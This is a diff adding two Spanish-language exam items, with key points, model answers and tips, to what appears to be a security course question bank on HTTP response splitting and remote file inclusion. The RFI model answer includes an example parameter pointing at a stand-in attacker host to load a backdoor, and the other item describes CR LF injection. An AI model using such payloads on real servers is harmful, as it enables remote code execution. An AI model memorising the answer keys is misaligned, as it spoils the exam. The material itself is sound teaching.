@@ -115,6 +115,51 @@
       ],
       "fromClass": false,
       "sections": ["catalogos", "cve"]
+    },
+    {
+      "id": "sistemas-t03-d6",
+      "kind": "corta",
+      "points": 2,
+      "minutes": 7,
+      "prompt": "Explica en qué consiste el HTTP response splitting (CWE-113): qué caracteres usa el atacante, qué condición de la aplicación lo permite, qué ataques facilita y cómo se previene.",
+      "keyPoints": [
+        "Explica que las líneas de las cabeceras se separan con retorno de carro y salto de línea (CR LF, \\r\\n o %0d%0a) y una línea en blanco separa cabeceras y cuerpo",
+        "Indica que ocurre cuando la aplicación mete datos del usuario sin validar en una cabecera de respuesta (cookie, redirección)",
+        "Explica que, al inyectar CR LF, el atacante añade cabeceras o una segunda respuesta completa que controla",
+        "Enumera impactos: secuestro de sesión con una cookie suya, XSS (inyección de HTML y JavaScript), envenenamiento de caché, redirecciones a phishing",
+        "Indica la prevención: eliminar o codificar CR y LF, usar funciones de codificación de HTTP y no poner entrada del usuario en cabeceras (o usar lista blanca)",
+        "Aclara que no tiene relación con la inyección SQL"
+      ],
+      "model": [
+        "Una respuesta HTTP tiene cabeceras, cada una en su línea, separadas por dos caracteres invisibles: **retorno de carro y salto de línea** (CR LF, \\r\\n, %0d%0a en una URL). Una línea en blanco separa las cabeceras del cuerpo. El **response splitting** aparece cuando la aplicación copia **datos del usuario sin validar en una cabecera** de la respuesta, por ejemplo el idioma elegido en una cookie.",
+        "Si el atacante mete %0d%0a en ese dato, cierra la cabecera y escribe las suyas, o incluso una **segunda respuesta completa**: el navegador cree que recibe dos respuestas y la segunda la controla él. Así puede inyectar una **cookie de sesión** suya (secuestro de sesión), meter **HTML o JavaScript** (un XSS indirecto), **envenenar la caché** de un proxy o una CDN para que sirva la respuesta falsa a otros, o redirigir a una web de phishing. No tiene nada que ver con la inyección SQL.",
+        "Se previene **eliminando o codificando CR y LF** antes de construir cualquier cabecera (la medida más eficaz), con funciones de codificación de HTTP, como las librerías de OWASP, y evitando poner entrada del usuario en las cabeceras; si no hay más remedio, solo valores de una **lista blanca**, siempre validando en el servidor."
+      ],
+      "tip": "En clase el profesor lo enseñó con Mutillidae: las dobles parejas CR LF cierran las cabeceras y lo que sigue se interpreta como cuerpo. Si preguntan qué puede suponer: inyección de HTML y JavaScript, no SQL.",
+      "fromClass": true,
+      "sections": ["response-splitting"]
+    },
+    {
+      "id": "sistemas-t03-d7",
+      "kind": "corta",
+      "points": 2,
+      "minutes": 6,
+      "prompt": "¿Qué es la inclusión remota de archivos (RFI)? Explica con un ejemplo cómo se explota, en qué se diferencia de la LFI, cuál es su riesgo principal y cómo se previene.",
+      "keyPoints": [
+        "Define RFI como hacer que la aplicación incluya y ejecute un archivo alojado en un servidor externo del atacante",
+        "Pone un ejemplo con un parámetro que recibe el nombre del archivo y el atacante pone una URL suya",
+        "Distingue de LFI: en LFI el archivo ya está en el servidor víctima y el atacante solo lo lee; en RFI lo escribe el atacante",
+        "Identifica la ejecución remota de código (RCE) como el riesgo principal, que puede dar el control del servidor",
+        "Indica la prevención: desactivar allow_url_include en PHP, lista blanca de archivos o identificadores y mínimo privilegio"
+      ],
+      "model": [
+        "La **RFI** (Remote File Inclusion) es una vulnerabilidad por la que la aplicación **incluye y ejecuta un archivo que está en un servidor del atacante**. Es típica de aplicaciones PHP que cargan contenido según un parámetro: si lo normal es pagina.php?archivo=inicio.php, el atacante pone archivo=http://atacante.example.com/backdoor.txt y el servidor descarga ese archivo y lo **ejecuta como si fuera suyo**. Suele ser una puerta trasera o una web shell, con un nombre que no coincida con ningún archivo local.",
+        "Se diferencia de la **LFI** en el origen: en la LFI el archivo ya está en el servidor víctima y el atacante solo consigue leerlo; en la RFI el archivo lo escribe el atacante a su gusto. Por eso el riesgo estrella de la RFI es la **ejecución remota de código (RCE)**: toma del servidor, robo de datos o instalación de malware.",
+        "Se previene **desactivando allow_url_include** en la configuración de PHP, validando la entrada con una **lista blanca** de archivos permitidos (o identificadores que no se puedan manipular) y ejecutando el servidor con **mínimo privilegio**."
+      ],
+      "tip": "Si la opción habla de «ejecutar código alojado bajo control externo», es RFI; «leer una ruta local» es LFI.",
+      "fromClass": false,
+      "sections": ["rfi", "lfi"]
     }
   ],
   "cases": [
